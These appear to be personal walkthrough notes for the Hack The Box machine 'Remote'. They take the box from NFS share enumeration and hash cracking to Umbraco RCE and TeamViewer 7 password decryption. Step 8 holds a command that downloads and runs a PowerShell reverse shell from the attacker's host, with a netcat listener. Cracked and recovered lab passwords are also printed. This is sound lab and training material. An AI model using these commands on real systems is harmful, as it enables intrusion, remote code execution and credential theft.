#box #nfs #mount #umbraco #sdf #PrintSpoofer #TeamViewer7
1. Remote shows a website hosted on port 80.
2. Most importantly a NFS Share is hosted on port 2049. We query it with `showmount` and discover a share named `/site_backups` is available
```sh
showmount -e 10.129.230.172
Export list for 10.129.230.172:
/site_backups (everyone)
```
3. Once seen the available we proceed with mounting it on our system with
```sh
mount -t nfs 10.129.230.172:/site_backups site_backups
```
4. Once mounted, we look for interesting files such as credentials and discover a weird file named `Umbraco.sdf`. By looking online, the `.sdf` file seems to be a database file. We try multiple ways to open it with other software unsuccessfully, so we opt to try to use `strings` and check for significant information inside of it, discovering some usernames and a hash
```sh
strings site_backups/App_Data/Umbraco.sdf
```

![[attachments/remote-1.png]]
5. After cracking the available hashes with hashcat, we discover that only the first `SHA1` can be cracked accordingly, returning the password `baconandcheese`
```sh
hashcat -m 100 'b8be16afba8c314ad33d812f22a04991b90e2aaa' /usr/share/wordlists/rockyou.txt
```
6. We immediately try that onto the `umbraco` login by trying `admin:baconandcheese` and `admin@htb.local:baconandcheese` and succeed to authenticate with the second one at `http://10.129.18.107/umbraco#/login/`
7. Once authenticated we immediately recognize the version being `7.12.4` from the `?` on the bottom left of the page and discover this version is vulnerable to a RCE that can be found here https://github.com/Jonoans/Umbraco-RCE
![[attachments/remote-2.png]]
8. After some refinement, we manage to get a shell with the following command:
```sh
python3 exploit.py -u 'admin@htb.local' -p 'baconandcheese' -i http://10.129.18.107 -c powershell.exe -a "-Command IEX(IWR http://10.10.16.197:8002/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.16.197 4444"
```

>To make the Invoke-ConPtyShell properly work our listener will look like this `stty raw -echo; (stty size; cat) | nc -lvnp 4444`
9. To escalate, we can either use `PrintSpoofer` or leverage the fact that a Teamviewer 7 instance is running on the target machine. The version of Teamviewer 7 is vulnerable to the following CVE https://nvd.nist.gov/vuln/detail/CVE-2019-18988 that consists in decrypt the password of the user running that service. We discover the following PoC https://github.com/mr-r3b00t/CVE-2019-18988 and proceed with extracting the password and decrypt it inside cyberchef using the "Recipe" at the end of that PoC as a comment
```sh
reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7
```
![[attachments/remote-3.png]]
![[attachments/remote-4.png]]
![[attachments/remote-5.png]]
10. We then validate that the credentials for the Administrator user are correct through `nxc`
```sh
nxc smb 10.129.18.107 -u 'Administrator' -p '!R3m0te!'
```
![[attachments/remote-6.png]]